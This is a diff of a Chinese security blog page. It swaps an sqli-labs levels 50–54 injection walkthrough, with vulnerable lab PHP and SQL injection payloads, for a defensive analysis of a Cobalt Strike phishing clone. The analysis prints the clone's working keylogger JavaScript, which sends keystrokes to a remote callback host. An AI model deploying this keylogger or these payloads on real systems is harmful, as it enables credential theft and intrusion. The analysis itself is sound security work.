@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>sqli labs Less 50 -&gt; Less 54 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="sqli labs Less 50 -&gt; Less 54 | 九世的博客">
+  <title>cs钓鱼克隆网站分析 | 九世的博客</title>
+  <meta name="keywords" content=" 恶意分析 ">
+  <meta name="description" content="cs钓鱼克隆网站分析 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1764,9 +1764,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-sqli-labs-Less-50-Less-54" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-cs钓鱼克隆网站分析" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">sqli labs Less 50 -&gt; Less 54</h1>
+        <h1 class="article-title">cs钓鱼克隆网站分析</h1>
     
     <div class="article-meta">
         
@@ -1775,14 +1775,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color5">恶意分析</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2019-02-14 18:37</time>
+        创建时间:<time class="date" title="更新时间: 2021-06-10 17:54:43">2021-06-10 17:49</time>
         
     </div>
     <div class="article-meta">
@@ -1804,7 +1804,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#分析过程"><span class="toc-text">分析过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1819,559 +1819,97 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr>
-<p>距离上学还有3天，今天继续闯sqli-labs靶场，从50关崩到54关，感觉可还行<br><img src="http://i0.hdslb.com/bfs/archive/5e52287fe186c4bb6a714985fb0ef5a4625558ff.jpg" alt="5e52287fe186c4bb6a714985fb0ef5a4625558ff.jpg"><br><b>BGM:喜欢</b></p>
-<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=526464145&auto=1&height=66"></iframe>
-
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><hr>
-<p>50关代码</p>
-<pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
-&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
-&lt;title&gt;ORDER BY Clause Blind based&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body bgcolor=&quot;#000000&quot;&gt;
-&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
-&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;
-
-&lt;?php
-include(&quot;../sql-connections/sqli-connect.php&quot;);
-error_reporting(0);
-$id=$_GET[&#39;sort&#39;];    
-if(isset($id))
-{
-    //logging the connection parameters to a file for analysis.
-    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
-    fwrite($fp,&#39;SORT:&#39;.$id.&quot;\n&quot;);
-    fclose($fp);
-
-    $sql=&quot;SELECT * FROM users ORDER BY $id&quot;;
-    /* execute multi query */
-    if (mysqli_multi_query($con1, $sql))
-    {
-
-        ?&gt;
-        &lt;center&gt;
-        &lt;font color= &quot;#00FF00&quot; size=&quot;4&quot;&gt;
-
-        &lt;table   border=1&#39;&gt;
-        &lt;tr&gt;
-            &lt;th&gt;&amp;nbsp;ID&amp;nbsp;&lt;/th&gt;
-            &lt;th&gt;&amp;nbsp;USERNAME&amp;nbsp;  &lt;/th&gt;
-            &lt;th&gt;&amp;nbsp;PASSWORD&amp;nbsp;  &lt;/th&gt;
-        &lt;/tr&gt;
-        &lt;/font&gt;
-        &lt;/font&gt;
-        &lt;?php
-            /* store first result set */
-            if ($result = mysqli_store_result($con1))
-            {
-                while($row = mysqli_fetch_row($result))
-                {
-                    echo &#39;&lt;font color= &quot;#00FF11&quot; size=&quot;3&quot;&gt;&#39;;        
-                    echo &quot;&lt;tr&gt;&quot;;
-                    echo &quot;&lt;td&gt;&quot;;
-                    printf(&quot;%s&quot;, $row[0]);
-                    echo &quot;&lt;/td&gt;&quot;;
-                    echo &quot;&lt;td&gt;&quot;;
-                    printf(&quot;%s&quot;, $row[1]);
-                    echo &quot;&lt;/td&gt;&quot;;
-                    echo &quot;&lt;td&gt;&quot;;
-                    printf(&quot;%s&quot;, $row[2]);
-                    echo &quot;&lt;/td&gt;&quot;;
-                    echo &quot;&lt;/tr&gt;&quot;;
-                    echo &quot;&lt;/font&gt;&quot;;
-
-                }
-
-            }
-    echo &quot;&lt;/table&gt;&quot;;
+        <h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>cs克隆<br><img src="https://z3.ax1x.com/2021/06/10/2RieSA.png" alt=""></p>
+<p>克隆后的html和原html对比<br><img src="https://z3.ax1x.com/2021/06/10/2RilTS.png" alt=""></p>
+<p>特征：</p>
+<ol>
+<li>IFRAME标签为大写，且长宽为0。</li>
+<li>script标签加载了js路径为”/jquery/jquery.min.js”</li>
+</ol>
+<p>顺序特征:</p>
+<ol>
+<li>IFRAME标签和script标签同时出现时，一定是IFRAME标签、script标签和body标签这个顺序。</li>
+<li>IFRAME标签和script标签只出现一个时，一定在body标签之前。</li>
+</ol>
+<p>引用的js分析：</p>
+<pre><code class="javascript">var cfqPdaQzXzSSf = 0;
+window.onload = function loadfqPdaQzXzSSf() { //页面加载处理事件
+    lfqPdaQzXzSSf = &quot;,&quot;;
+    if (window.addEventListener)  { //对象触发指定的事件
+        document.addEventListener(&#39;keypress&#39;, pfqPdaQzXzSSf, true); //keypress所有键都会触发该事件，无论它们是否产生字符值 处理函数:pfqPdaQzXzSSf
+        document.addEventListener(&#39;keydown&#39;, dfqPdaQzXzSSf, true); //keydown当按下某个键时会触发该事件 处理函数:dfqPdaQzXzSSf
+    } else if (window.attachEvent)  { //attachEvent在IE9以下的版本中受到支持。其它的都支持addEventListener
+        document.attachEvent(&#39;onkeypress&#39;, pfqPdaQzXzSSf);
+        document.attachEvent(&#39;onkeydown&#39;, dfqPdaQzXzSSf);
+    } else { //两者都不支持全部置空
+        document.onkeypress = pfqPdaQzXzSSf;
+        document.onkeydown = dfqPdaQzXzSSf;
     }
 
-    else
-    {
-        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
-        print_r(mysqli_error($con1));
-        echo &quot;&lt;/font&gt;&quot;;  
-    }
-}
-else
-{
-    echo &quot;Please input parameter as SORT with numeric value&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-    echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-    echo &#39;&lt;img src=&quot;../images/Less-50.jpg&quot; /&gt;&lt;br&gt;&#39;;    
-}
-?&gt;
-&lt;/font&gt; 
-&lt;/div&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;/br&gt;
 
-&lt;/center&gt; 
-&lt;/body&gt;
-&lt;/html&gt;
+}
+
+
+function pfqPdaQzXzSSf(e) {
+    kfqPdaQzXzSSf = (window.event)?window.event.keyCode:e.which; //只有当DOM事件处理程序被调用的时
+    kfqPdaQzXzSSf = kfqPdaQzXzSSf.toString(16); //将键盘码转换为ascii
+    if (kfqPdaQzXzSSf != &quot;d&quot;)  { //随便写个判断进入函数
+        fqPdaQzXzSSf(kfqPdaQzXzSSf);
+    }
+
+
+}
+
+
+function dfqPdaQzXzSSf(e) {
+    kfqPdaQzXzSSf = (window.event)?window.event.keyCode:e.which;
+    if (kfqPdaQzXzSSf == 9||kfqPdaQzXzSSf == 8||kfqPdaQzXzSSf == 13)  { //tab键，退格键，回车键
+        fqPdaQzXzSSf(kfqPdaQzXzSSf);
+    }
+
+
+}
+
+
+function fqPdaQzXzSSf(kfqPdaQzXzSSf) {
+    lfqPdaQzXzSSf = lfqPdaQzXzSSf + kfqPdaQzXzSSf + &quot;,&quot;; //键盘值拼接
+    var tfqPdaQzXzSSf = &quot;ZUyQXfawhPbi&quot; + cfqPdaQzXzSSf;
+    cfqPdaQzXzSSf++;
+    var ffqPdaQzXzSSf;
+    if (document.all&amp;&amp;(navigator.appVersion.match(/MSIE ([\d.]+)/)[1]) &lt;= 8.0)  { //浏览器版本判断是否小于或等于8.0
+        ffqPdaQzXzSSf = document.createElement(String.fromCharCode(60) + &quot;script name=&#39;&quot;+tfqPdaQzXzSSf+&quot;&#39; id=&#39;&quot;+tfqPdaQzXzSSf+&quot;&#39;&quot; + String.fromCharCode(62) + String.fromCharCode(60) + &quot;/script&quot; + String.fromCharCode(62));
+    } else {
+        ffqPdaQzXzSSf = document.createElement(&quot;script&quot;);
+        ffqPdaQzXzSSf.setAttribute(&quot;id&quot;, tfqPdaQzXzSSf);
+        ffqPdaQzXzSSf.setAttribute(&quot;name&quot;, tfqPdaQzXzSSf);
+    }
+
+
+    var ejDBFWFHhff = &#39;?id=&#39; + window.location.href.split(/\?id=/)[1]; //取键盘ascii码
+    ffqPdaQzXzSSf.setAttribute(&quot;src&quot;, &quot;http://10.23.66.18:8080/callback&quot; + ejDBFWFHhff + &quot;&amp;data=&quot; + lfqPdaQzXzSSf);
+    ffqPdaQzXzSSf.style.visibility = &quot;hidden&quot;;
+    document.body.appendChild(ffqPdaQzXzSSf); //实例化js，发送键盘码
+    if (kfqPdaQzXzSSf == 13||lfqPdaQzXzSSf.length &gt; 3000)  { //判断键盘码为回车键置空lfqPdaQzXzSSf变量
+        lfqPdaQzXzSSf = &quot;,&quot;;
+    }
+
+
+    setTimeout(&#39;document.body.removeChild(document.getElementById(&quot;&#39; + tfqPdaQzXzSSf + &#39;&quot;))&#39;, 5000); //延时5秒删除创建的js
+}
 </code></pre>
-<p>还是order by注入，报错注入带走</p>
-<pre><code>http://127.0.0.1/sqli-labs-master/Less-50/?sort=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)
-</code></pre><p><img src="https://s2.ax1x.com/2019/02/14/kBzIXD.md.png" alt="kBzIXD.md.png"></p>
-<p>51关代码：</p>
-<pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
-&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
-&lt;title&gt;ORDER BY Clause Blind based&lt;/title&gt;
-&lt;/head&gt;
+<p>页面加载处理事件,添加针对键盘按下的事件。触发事件的时候进入dfqPdaQzXzSSf和dfqPdaQzXzSSf函数处理，最后调用fqPdaQzXzSSf函数，将键盘码通过创建script标签将数据传送到远端。最后延迟5秒后删除创建的js</p>
+<p>pfqPdaQzXzSSf函数：<br>键盘码转ascii码发送到fqPdaQzXzSSf函数</p>
+<p>dfqPdaQzXzSSf函数：<br>如果按下tab键，退格键，回车键调用fqPdaQzXzSSf函数发送键盘</p>
+<p><strong>chrome动态调试</strong><br><img src="https://z3.ax1x.com/2021/06/10/2RiDkF.png" alt="键盘码判断"></p>
+<p><img src="https://z3.ax1x.com/2021/06/10/2RirY4.png" alt="键盘码拼接"></p>
+<p><img src="https://z3.ax1x.com/2021/06/10/2Ri7pd.png" alt="js创建发送键盘码到远端"></p>
+<p>cs远端接收的密码<br><img src="https://z3.ax1x.com/2021/06/10/2RiqXt.png" alt=""></p>
+<p>360空间绘测特征搜索：</p>
+<pre><code>response:&quot;&lt;head&gt; &lt;base href=&quot; AND response:&quot;&lt;link rel=\&quot;shortcut icon\&quot; type=\&quot;image/x-icon\&quot; href=\&quot;/favicon.ico\&quot;&gt;&quot; AND response:&quot;jquery/jquery.min.js\&quot;&gt;&lt;/script&gt; &lt;/body&gt;&quot;
 
-&lt;body bgcolor=&quot;#000000&quot;&gt;
-&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
-&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;
-
-&lt;?php
-include(&quot;../sql-connections/sqli-connect.php&quot;);
-error_reporting(0);
-$id=$_GET[&#39;sort&#39;];    
-if(isset($id))
-{
-    //logging the connection parameters to a file for analysis.
-    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
-    fwrite($fp,&#39;SORT:&#39;.$id.&quot;\n&quot;);
-    fclose($fp);
-
-    $sql=&quot;SELECT * FROM users ORDER BY &#39;$id&#39;&quot;;
-    /* execute multi query */
-    if (mysqli_multi_query($con1, $sql)) 
-    {
-
-        ?&gt;
-        &lt;center&gt;
-        &lt;font color= &quot;#00FF00&quot; size=&quot;4&quot;&gt;
-
-        &lt;table   border=1&#39;&gt;
-        &lt;tr&gt;
-            &lt;th&gt;&amp;nbsp;ID&amp;nbsp;&lt;/th&gt;
-            &lt;th&gt;&amp;nbsp;USERNAME&amp;nbsp;  &lt;/th&gt;
-            &lt;th&gt;&amp;nbsp;PASSWORD&amp;nbsp;  &lt;/th&gt;
-        &lt;/tr&gt;
-        &lt;/font&gt;
-        &lt;/font&gt;
-        &lt;?php
-            /* store first result set */
-            if ($result = mysqli_store_result($con1))
-            {
-                while($row = mysqli_fetch_row($result))
-                {
-                    echo &#39;&lt;font color= &quot;#00FF11&quot; size=&quot;3&quot;&gt;&#39;;        
-                    echo &quot;&lt;tr&gt;&quot;;
-                    echo &quot;&lt;td&gt;&quot;;
-                    printf(&quot;%s&quot;, $row[0]);
-                    echo &quot;&lt;/td&gt;&quot;;
-                    echo &quot;&lt;td&gt;&quot;;
-                    printf(&quot;%s&quot;, $row[1]);
-                    echo &quot;&lt;/td&gt;&quot;;
-                    echo &quot;&lt;td&gt;&quot;;
-                    printf(&quot;%s&quot;, $row[2]);
-                    echo &quot;&lt;/td&gt;&quot;;
-                    echo &quot;&lt;/tr&gt;&quot;;
-                    echo &quot;&lt;/font&gt;&quot;;
-
-                }
-
-            }
-    echo &quot;&lt;/table&gt;&quot;;
-    }
-
-    else
-    {
-        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
-        print_r(mysqli_error($con1));
-        echo &quot;&lt;/font&gt;&quot;;  
-    }
-}
-else
-{
-    echo &quot;Please input parameter as SORT with numeric value&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-    echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-    echo &#39;&lt;img src=&quot;../images/Less-51.jpg&quot; /&gt;&lt;br&gt;&#39;;    
-}
-?&gt;
-&lt;/font&gt; 
-&lt;/div&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-
-&lt;/center&gt; 
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<p>多了个需要闭合还是报错注入带走</p>
-<pre><code>http://127.0.0.1/sqli-labs-master/Less-51/?sort=1%27%20and%20updatexml(1,concat(0x7e,(select%20user()),0x7e),1)%20--+
-</code></pre><p><img src="https://s2.ax1x.com/2019/02/14/kBzv1f.png" alt="kBzv1f.png"></p>
-<p>52关代码：</p>
-<pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
-&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
-&lt;title&gt;ORDER BY Clause Blind based&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body bgcolor=&quot;#000000&quot;&gt;
-&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
-&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;
-
-&lt;?php
-include(&quot;../sql-connections/sqli-connect.php&quot;);
-error_reporting(0);
-$id=$_GET[&#39;sort&#39;];    
-if(isset($id))
-{
-    //logging the connection parameters to a file for analysis.
-    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
-    fwrite($fp,&#39;SORT:&#39;.$id.&quot;\n&quot;);
-    fclose($fp);
-
-    $sql=&quot;SELECT * FROM users ORDER BY &#39;$id&#39;&quot;;
-    /* execute multi query */
-    if (mysqli_multi_query($con1, $sql)) /*查询*/
-    {
-
-        ?&gt;
-        &lt;center&gt;
-        &lt;font color= &quot;#00FF00&quot; size=&quot;4&quot;&gt;
-
-        &lt;table   border=1&#39;&gt;
-        &lt;tr&gt;
-            &lt;th&gt;&amp;nbsp;ID&amp;nbsp;&lt;/th&gt;
-            &lt;th&gt;&amp;nbsp;USERNAME&amp;nbsp;  &lt;/th&gt;
-            &lt;th&gt;&amp;nbsp;PASSWORD&amp;nbsp;  &lt;/th&gt;
-        &lt;/tr&gt;
-        &lt;/font&gt;
-        &lt;/font&gt;
-        &lt;?php
-            /* store first result set */
-            if ($result = mysqli_store_result($con1))
-            {
-                while($row = mysqli_fetch_row($result))
-                {
-                    echo &#39;&lt;font color= &quot;#00FF11&quot; size=&quot;3&quot;&gt;&#39;;        
-                    echo &quot;&lt;tr&gt;&quot;;
-                    echo &quot;&lt;td&gt;&quot;;
-                    printf(&quot;%s&quot;, $row[0]);
-                    echo &quot;&lt;/td&gt;&quot;;
-                    echo &quot;&lt;td&gt;&quot;;
-                    printf(&quot;%s&quot;, $row[1]);
-                    echo &quot;&lt;/td&gt;&quot;;
-                    echo &quot;&lt;td&gt;&quot;;
-                    printf(&quot;%s&quot;, $row[2]);
-                    echo &quot;&lt;/td&gt;&quot;;
-                    echo &quot;&lt;/tr&gt;&quot;;
-                    echo &quot;&lt;/font&gt;&quot;;
-
-                }
-
-            }
-    echo &quot;&lt;/table&gt;&quot;;
-    }
-
-}
-else
-{
-    echo &quot;Please input parameter as SORT with numeric value&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-    echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-    echo &#39;&lt;img src=&quot;../images/Less-53.jpg&quot; /&gt;&lt;br&gt;&#39;;    
-}
-?&gt;
-&lt;/font&gt; 
-&lt;/div&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-
-&lt;/center&gt; 
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<p>没有输出mysql报错，盲注带走</p>
-<pre><code>http://127.0.0.1/sqli-labs-master/Less-52/?sort=rand(length(database())=8)
-</code></pre><p><img src="https://s2.ax1x.com/2019/02/14/kDSkhq.md.png" alt="kDSkhq.md.png"></p>
-<p>53关代码：</p>
-<pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
-&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
-&lt;title&gt;ORDER BY Clause Blind based&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body bgcolor=&quot;#000000&quot;&gt;
-&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
-&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;
-
-&lt;?php
-include(&quot;../sql-connections/sqli-connect.php&quot;);
-error_reporting(0);
-$id=$_GET[&#39;sort&#39;];    
-if(isset($id))
-{
-    //logging the connection parameters to a file for analysis.
-    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
-    fwrite($fp,&#39;SORT:&#39;.$id.&quot;\n&quot;);
-    fclose($fp);
-
-    $sql=&quot;SELECT * FROM users ORDER BY &#39;$id&#39;&quot;;
-    /* execute multi query */
-    if (mysqli_multi_query($con1, $sql)) /*查询*/
-    {
-
-        ?&gt;
-        &lt;center&gt;
-        &lt;font color= &quot;#00FF00&quot; size=&quot;4&quot;&gt;
-
-        &lt;table   border=1&#39;&gt;
-        &lt;tr&gt;
-            &lt;th&gt;&amp;nbsp;ID&amp;nbsp;&lt;/th&gt;
-            &lt;th&gt;&amp;nbsp;USERNAME&amp;nbsp;  &lt;/th&gt;
-            &lt;th&gt;&amp;nbsp;PASSWORD&amp;nbsp;  &lt;/th&gt;
-        &lt;/tr&gt;
-        &lt;/font&gt;
-        &lt;/font&gt;
-        &lt;?php
-            /* store first result set */
-            if ($result = mysqli_store_result($con1))
-            {
-                while($row = mysqli_fetch_row($result))
-                {
-                    echo &#39;&lt;font color= &quot;#00FF11&quot; size=&quot;3&quot;&gt;&#39;;        
-                    echo &quot;&lt;tr&gt;&quot;;
-                    echo &quot;&lt;td&gt;&quot;;
-                    printf(&quot;%s&quot;, $row[0]);
-                    echo &quot;&lt;/td&gt;&quot;;
-                    echo &quot;&lt;td&gt;&quot;;
-                    printf(&quot;%s&quot;, $row[1]);
-                    echo &quot;&lt;/td&gt;&quot;;
-                    echo &quot;&lt;td&gt;&quot;;
-                    printf(&quot;%s&quot;, $row[2]);
-                    echo &quot;&lt;/td&gt;&quot;;
-                    echo &quot;&lt;/tr&gt;&quot;;
-                    echo &quot;&lt;/font&gt;&quot;;
-
-                }
-
-            }
-    echo &quot;&lt;/table&gt;&quot;;
-    }
-
-}
-else
-{
-    echo &quot;Please input parameter as SORT with numeric value&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-    echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-    echo &#39;&lt;img src=&quot;../images/Less-53.jpg&quot; /&gt;&lt;br&gt;&#39;;    
-}
-?&gt;
-&lt;/font&gt; 
-&lt;/div&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-
-&lt;/center&gt; 
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<p>回显不正常只能延时注入，由于延时注入从图片中看不出效果这里就不放了</p>
-<pre><code>http://127.0.0.1/sqli-labs-master/Less-53/?sort=1%27%20and%20sleep(if((length(dataabse())=8),1,4))%20--+
-</code></pre><p>54关代码：</p>
-<pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
-&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
-&lt;title&gt;Less-54:Challenge-1&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body bgcolor=&quot;#000000&quot;&gt;
-&lt;div style =&quot;text-align:right&quot;&gt;
-&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;
-&lt;input  type=&quot;submit&quot; name=&quot;reset&quot; value=&quot;Reset the Challenge!&quot; /&gt;
-&lt;/form&gt;
-&lt;/div&gt;
-&lt;/right&gt;
-&lt;div style=&quot; margin-top:20px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
-&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;
-
-
-
-&lt;?php
-//including the Mysql connect parameters.
-include &#39;../sql-connections/sql-connect-1.php&#39;;
-include &#39;../sql-connections/functions.php&#39;;
-error_reporting(0);
-$pag = $_SERVER[&#39;PHP_SELF&#39;]; //generating page address to piggy back after redirects... /*获取当前php的路径*/
-$characters = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;; //characterset for generating random data /*用于生成随机数据的字符集*/
-$times= 10;
-$table = table_name();
-$col = column_name(1);     // session id column name
-$col1 = column_name(2);   //secret key column name
-
-
-// Submitting the final answer
-if(!isset($_POST[&#39;answer_key&#39;])) /*判断answer_key如果否存在，如果不存在则执行以下操作*/
-{
-    // resetting the challenge and repopulating the table .
-    if(isset($_POST[&#39;reset&#39;])) /*如果POST的传参reset存在*/
-    {
-        setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000); /*设置一个cookie然后跳转*/
-        echo &quot;&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n&quot;;
-        echo &quot;Redirecting you to main challenge page..........\n&quot;;
-        header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; ); /*重定向到主页*/
-        //echo &quot;cookie expired&quot;;
-
-    }
-    else
-    {
-        // Checking the cookie on the page and populate the table with random value.
-        if(isset($_COOKIE[&#39;challenge&#39;])) /*判断是否有cookie存在*/
-        {
-            $sessid=$_COOKIE[&#39;challenge&#39;];
-            //echo &quot;Cookie value: &quot;.$sessid;
-        }
-        else
-        {
-            $expire = time()+60*60*24*30;
-            $hash = data($table,$col);
-            setcookie(&quot;challenge&quot;, $hash, $expire); /*如果是第一次访问给予一个cookie*/
-
-        }
-
-        echo &quot;&lt;br&gt;\n&quot;;
-
-        // take the variables
-        if(isset($_GET[&#39;id&#39;])) /*判断是否有GET传参ID的存在*/
-        {
-            $id=$_GET[&#39;id&#39;];
-
-            //logging the connection parameters to a file for analysis.
-            $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
-            fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);
-            fclose($fp);
-
-
-            //update the counter in database
-            next_tryy();
-
-            //Display attempts on screen.
-            $tryyy = view_attempts();
-            echo &quot;You have made : &quot;. $tryyy .&quot; of $times attempts&quot;;
-            echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;\n&quot;;
-
-
-            //Reset the Database if you exceed allowed attempts.
-            if($tryyy &gt;= ($times+1))
-            {
-                setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000);
-                echo &quot;&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\n&quot;;
-                echo &quot;Redirecting you to challenge page..........\n&quot;;
-                header( &quot;refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );
-                echo &quot;&lt;br&gt;\n&quot;;
-            }    
-
-
-
-            // Querry DB to get the correct output
-            $sql=&quot;SELECT * FROM security.users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
-            $result=mysql_query($sql);
-            $row = mysql_fetch_array($result);
-
-            if($row)
-            {
-                echo &#39;&lt;font color= &quot;#00FFFF&quot;&gt;&#39;;    
-                echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
-                echo &quot;&lt;br&gt;&quot;;
-                echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
-                echo &quot;&lt;/font&gt;&quot;;
-            }
-            else 
-            {
-                echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
-//                print_r(mysql_error());
-                echo &quot;&lt;/font&gt;&quot;;  
-            }
-        }
-        else
-        {
-            echo &quot;Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;&quot;;
-            echo &quot;&lt;font color=&#39;#00FFFF&#39;: size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;(&#39;CHALLENGES&#39;)&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;&quot;;
-            echo &quot;For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;&quot; ;
-        }
-
-    }
-
-
-?&gt;
-&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;
-&lt;img src=&quot;../images/Less-54.jpg&quot; /&gt;
-&lt;/center&gt;
-&lt;br&gt;&lt;br&gt;&lt;br&gt;
-&lt;div  style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;
-&lt;form name=&quot;input&quot; action=&quot;&quot; method=&quot;post&quot;&gt;
